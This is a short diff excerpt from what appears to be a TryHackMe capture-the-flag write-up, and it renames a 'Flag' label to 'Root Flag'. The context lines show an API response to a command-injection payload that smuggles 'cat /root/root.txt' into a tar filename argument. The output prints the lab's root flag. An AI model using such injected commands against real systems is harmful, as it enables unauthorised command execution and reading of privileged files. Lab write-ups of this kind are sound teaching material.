@@ -244,4 +244,4 @@ web@tryhackme-2404:~$ curl -s -X POST -H "Authorization: Bearer $key" -H "Conten
 ```
 {"command":"tar czf /var/automation/exports/test; cat /root/root.txt;.tgz /var/automation/data 2>&1","output":"THM{tr4c3d_t0_th3_h0r1z0n}\n/bin/sh: 1: .tgz: not found\ntar: Cowardly refusing to create an empty archive\nTry 'tar --help' or 'tar --usage' for more information.\n"}
 ```
-**Flag: THM{tr4c3d_t0_th3_h0r1z0n}**
+**Root Flag: THM{tr4c3d_t0_th3_h0r1z0n}**
